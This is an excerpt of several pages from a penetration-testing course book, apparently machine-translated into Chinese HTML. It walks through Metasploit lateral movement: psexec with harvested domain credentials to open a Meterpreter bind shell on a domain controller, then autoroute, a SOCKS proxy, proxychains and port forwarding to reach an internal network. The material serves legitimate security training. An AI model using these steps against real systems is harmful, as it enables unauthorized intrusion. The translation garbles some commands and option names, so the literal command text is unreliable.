<div style="position:absolute;top:118450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMBPass =&gt; Qwerty09！</font></font></nobr></div>
<div style="position:absolute;top:118484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/smb/psexec_psh）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 RHOSTS 192.168.1.110</font></font></font></b></nobr></div>
<div style="position:absolute;top:118501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS =&gt; 192.168.1.110</font></font></nobr></div>
<div style="position:absolute;top:118535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/smb/psexec_psh）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置有效载荷 windows/meterpreter/bind_tcp</font></font></font></b></nobr></div>
<div style="position:absolute;top:118552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷 =&gt; windows/meterpreter/bind_tcp</font></font></nobr></div>
<div style="position:absolute;top:118585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/smb/psexec_psh）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 RHOST 192.168.1.110</font></font></font></b></nobr></div>
<div style="position:absolute;top:118602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST =&gt; 192.168.1.110</font></font></nobr></div>
<div style="position:absolute;top:118636;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/smb/psexec_psh）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LPORT 444</font></font></font></b></nobr></div>
<div style="position:absolute;top:118654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">左端口 =&gt; 444</font></font></nobr></div>
<div style="position:absolute;top:118687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/smb/psexec_psh）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:118721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 192.168.1.110:445 - 连接到服务器...</font></font></nobr></div>
<div style="position:absolute;top:118738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 192.168.1.110:445 - 以用户“jeff_admin”身份向 192.168.1.110:445|corp 进行身份验证。</font></font></nobr></div>
<div style="position:absolute;top:118755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">..</font></font></nobr></div>
<div style="position:absolute;top:118772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 192.168.1.110:445 - 选择 PowerShell 目标</font></font></nobr></div>
<div style="position:absolute;top:118789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 192.168.1.110:445 - 执行有效载荷...</font></font></nobr></div>
<div style="position:absolute;top:118806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 192.168.1.110:445 - 服务启动超时，如果运行命令或非服务，则OK</font></font></nobr></div>
<div style="position:absolute;top:118823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可执行文件...</font></font></nobr></div>
<div style="position:absolute;top:118840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 开始针对 192.168.1.110:444 绑定 TCP 处理程序 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:118975;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="101"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 101 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:119008;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:120085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:120085;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:120085;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">718</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（180291 字节）到 192.168.1.110</font></font></nobr></div>
<div style="position:absolute;top:119120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter session 5 打开 (10.11.0.4-10.11.0.22:0 -&gt; 192.168.1.110:444)</font></font></font></b></nobr></div>
<div style="position:absolute;top:119154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:119174;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 807 - 使用来自 Metasploit 的 PsExec</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:119203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请务必注意，添加的路由仅适用于已建立的连接。</font><font style="vertical-align: inherit;">因为</font></font></nobr></div>
<div style="position:absolute;top:119223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样，域控制器上的新 shell 必须是一个绑定 shell，从而允许我们使用 set</font></font></nobr></div>
<div style="position:absolute;top:119242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到它的路由。</font><font style="vertical-align: inherit;">反向shell有效载荷将无法找到返回我们攻击的方法</font></font></nobr></div>
<div style="position:absolute;top:119261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统，因为域控制器没有为我们的网络定义路由。</font><font style="vertical-align: inherit;">在这</font></font></nobr></div>
<div style="position:absolute;top:119281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以这种方式，我们能够从内部的域控制器获得一个meterpreter shell</font></font></nobr></div>
<div style="position:absolute;top:119300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">否则我们将无法直接访问网络。</font></font></nobr></div>
<div style="position:absolute;top:119333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为手动添加路由的替代方法，我们可以使用 autoroute post-exploitation 模块，</font></font></nobr></div>
<div style="position:absolute;top:119352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它可以通过现有的 Meterpreter 会话自动设置枢轴路由。</font><font style="vertical-align: inherit;">清单 808</font></font></nobr></div>
<div style="position:absolute;top:119371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">演示如何调用模块。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:119406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用多/管理/自动路由</font></font></font></b></nobr></div>
<div style="position:absolute;top:119440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 post(multi/manage/autoroute) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:119474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块选项（post/multi/manage/autoroute）：</font></font></nobr></div>
<div style="position:absolute;top:119508;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:119525;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:119542;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CMD 自动添加    </font></font></nobr></div>
<div style="position:absolute;top:119542;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">yes 指定自动路由命令（接受：添加，一个</font></font></nobr></div>
<div style="position:absolute;top:119559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动添加、打印、删除、默认）</font></font></nobr></div>
<div style="position:absolute;top:119576;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网罩 255.255.255.0 无    </font></font></nobr></div>
<div style="position:absolute;top:119576;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络掩码（IPv4 为“255.255.255.0”或 CIDR 为“/2</font></font></nobr></div>
<div style="position:absolute;top:119593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4"</font></font></nobr></div>
<div style="position:absolute;top:119610;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会议    </font></font></nobr></div>
<div style="position:absolute;top:119610;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">yes 运行此模块的会话。</font></font></nobr></div>
<div style="position:absolute;top:119627;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网    </font></font></nobr></div>
<div style="position:absolute;top:119627;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:119627;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网（IPv4，例如 10.10.10.0）</font></font></nobr></div>
<div style="position:absolute;top:119661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 post(multi/manage/autoroute) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 -l</font></font></font></b></nobr></div>
<div style="position:absolute;top:119695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活跃期</font></font></nobr></div>
<div style="position:absolute;top:119712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================</font></font></nobr></div>
<div style="position:absolute;top:119746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ID 名称类型    </font></font></nobr></div>
<div style="position:absolute;top:119746;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息    </font></font></nobr></div>
<div style="position:absolute;top:119746;left:733"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接</font></font></nobr></div>
<div style="position:absolute;top:119763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n</font></font></nobr></div>
<div style="position:absolute;top:119780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- ---- ----    </font></font></nobr></div>
<div style="position:absolute;top:119780;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------    </font></font></nobr></div>
<div style="position:absolute;top:119780;left:733"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------</font></font></nobr></div>
<div style="position:absolute;top:119797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">——</font></font></nobr></div>
<div style="position:absolute;top:119813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4    </font></font></nobr></div>
<div style="position:absolute;top:119813;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter x86/windows NT AUTHORITY\SYSTEM @ WIN10-X86 10.11.0.4:5555 -&gt;</font></font></nobr></div>
<div style="position:absolute;top:119830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22:1883 (10.11.0.22)</font></font></nobr></div>
<div style="position:absolute;top:119865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 post(multi/manage/autoroute) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置会话 4</font></font></font></b></nobr></div>
<div style="position:absolute;top:119881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 =&gt; 4</font></font></nobr></div>
<div style="position:absolute;top:119915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 post(multi/manage/autoroute) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:119949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[!] SESSION 可能与此模块不兼容。</font></font></nobr></div>
<div style="position:absolute;top:119966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 针对 CLIENT251 运行模块</font></font></nobr></div>
<div style="position:absolute;top:119983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 搜索要自动路由的子网。</font></font></nobr></div>
<div style="position:absolute;top:120000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 从主机的路由表中添加到子网 192.168.1.0/255.255.255.0 的路由。</font></font></nobr></div>
<div style="position:absolute;top:120017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 从主机的路由表中添加到子网 10.11.0.0/255.255.0.0 的路由。</font></font></nobr></div>
<div style="position:absolute;top:120034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 从 Fortinet 虚拟适配器添加到子网 169.254.0.0/255.255.0.0 的路由。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:120163;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="102"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 102 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:120196;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:121273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:121273;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:121273;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">719</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:120292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 后模块执行完成</font></font></nobr></div>
<div style="position:absolute;top:120308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 后（多/管理/自动路由）&gt; </font></font></nobr></div>
<div style="position:absolute;top:120328;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 808 - 调用自动路由模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:120357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以将路由与 server/socks4a 模块结合起来配置一个 SOCKS 代理。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:120376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许 Metasploit 框架之外的应用程序通过枢轴隧道。</font><font style="vertical-align: inherit;">为此，我们</font></font></nobr></div>
<div style="position:absolute;top:120396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先将模块设置为使用 localhost 作为代理：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:120431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 post(multi/manage/autoroute) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用辅助/服务器/socks4a</font></font></font></b></nobr></div>
<div style="position:absolute;top:120465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（服务器/socks4a）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:120499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块选项（辅助/服务器/socks4a）：</font></font></nobr></div>
<div style="position:absolute;top:120533;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:120550;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:120567;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SRVHOST 0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:120567;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是要收听的地址</font></font></nobr></div>
<div style="position:absolute;top:120583;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SRVPORT 1080    </font></font></nobr></div>
<div style="position:absolute;top:120583;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是要侦听的端口。</font></font></nobr></div>
<div style="position:absolute;top:120635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">辅助动作：</font></font></nobr></div>
<div style="position:absolute;top:120668;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 说明</font></font></nobr></div>
<div style="position:absolute;top:120685;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- ------------</font></font></nobr></div>
<div style="position:absolute;top:120702;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理人  </font></font></nobr></div>
<div style="position:absolute;top:120753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（服务器/socks4a）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 SRVHOST 127.0.0.1</font></font></font></b></nobr></div>
<div style="position:absolute;top:120770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SRVHOST =&gt; 127.0.0.1</font></font></nobr></div>
<div style="position:absolute;top:120804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（服务器/socks4a）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用-j</font></font></font></b></nobr></div>
<div style="position:absolute;top:120821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 作为后台作业 0 运行的辅助模块。</font></font></nobr></div>
<div style="position:absolute;top:120855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 启动socks4a代理服务器</font></font></nobr></div>
<div style="position:absolute;top:120874;left:290"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 809 - 使用自动路由设置 SOCKS 代理</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:120904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在可以更新我们的 ProxyChains 配置文件 (/etc/proxychains.conf) 以利用</font></font></nobr></div>
<div style="position:absolute;top:120923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SOCKS 代理。</font><font style="vertical-align: inherit;">这是通过添加配置行来完成的，如下面的清单 810 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:120958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo echo "socks4 127.0.0.1 1080" &gt;&gt; /etc/proxychains.conf</font></font></font></b></nobr></div>
<div style="position:absolute;top:120977;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 810 - 配置 ProxyChains 以使用正确的端口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:121007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理链</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来运行像</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rdesktop</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这样的应用程序</font><font style="vertical-align: inherit;">来从</font></font></nobr></div>
<div style="position:absolute;top:121026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的 Kali Linux 系统到内部网络上的域控制器。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:121061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo proxychains rdesktop 192.168.1.110</font></font></font></b></nobr></div>
<div style="position:absolute;top:121078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyChains-3.1 (http://proxychains.sf.net)</font></font></nobr></div>
<div style="position:absolute;top:121095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动选择的键盘映射 en-us</font></font></nobr></div>
<div style="position:absolute;top:121112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.1.110:3389-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:121129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误：CredSSP：初始化失败，您是否有正确的 kerberos tgt 初始化？</font></font></nobr></div>
<div style="position:absolute;top:121146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.1.110:3389-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:121163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 SSL 建立的连接。</font></font></nobr></div>
<div style="position:absolute;top:121180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告：远程桌面不支持色深 24；</font><font style="vertical-align: inherit;">回落到 16</font></font></nobr></div>
<div style="position:absolute;top:121199;left:254"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 811 - 在内部网络中获得远程桌面访问 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:121351;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="103"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 103 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:121384;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:122461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:122461;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:122461;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">720</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:121480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来打开rdesktop客户端，让我们登录域控制器，如图</font></font></nobr></div>
<div style="position:absolute;top:121499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">315：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:121972;left:256"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 315：从 Kali Linux 到内部网络的远程桌面访问</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:122003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们也可以使用类似的技术</font><font style="vertical-align: inherit;">从内部</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">portfwd</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">进行端口转发</font></font></nobr></div>
<div style="position:absolute;top:122023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个meterpreter会话，它将一个特定的端口转发到内部网络。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:122057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">portfwd -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:122074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：portfwd [-h] [add | </font><font style="vertical-align: inherit;">删除 | </font><font style="vertical-align: inherit;">列表 | </font><font style="vertical-align: inherit;">冲洗] [参数]</font></font></nobr></div>
<div style="position:absolute;top:122125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:122159;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-L &lt;opt&gt; Forward：要监听的本地主机（可选）。</font><font style="vertical-align: inherit;">反向：本地主机到 conn</font></font></nobr></div>
<div style="position:absolute;top:122176;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-R    </font></font></nobr></div>
<div style="position:absolute;top:122176;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示反向端口转发。</font></font></nobr></div>
<div style="position:absolute;top:122193;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-H    </font></font></nobr></div>
<div style="position:absolute;top:122193;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助横幅。</font></font></nobr></div>
<div style="position:absolute;top:122210;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i &lt;opt&gt; 要与之交互的端口转发条目的索引（请参阅“list”命令</font></font></nobr></div>
<div style="position:absolute;top:122227;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l &lt;opt&gt; 转发：要监听的本地端口。</font><font style="vertical-align: inherit;">反向：要连接到的本地端口。</font></font></nobr></div>
<div style="position:absolute;top:122244;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p &lt;opt&gt; 转发：要连接的远程端口。</font><font style="vertical-align: inherit;">反向：要监听的远程端口。</font></font></nobr></div>
<div style="position:absolute;top:122261;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r &lt;opt&gt; Forward：要连接的远程主机。</font></font></nobr></div>
<div style="position:absolute;top:122280;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 812 - 可用于 portfwd 命令的选项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:122310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以在受感染主机上创建一个从本地主机端口 3389 到端口 3389 的端口转发</font></font></nobr></div>
<div style="position:absolute;top:122329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(192.168.1.110) 如清单 813 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:122364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">portfwd 添加 -l 3389 -p 3389 -r 192.168.1.110</font></font></font></b></nobr></div>
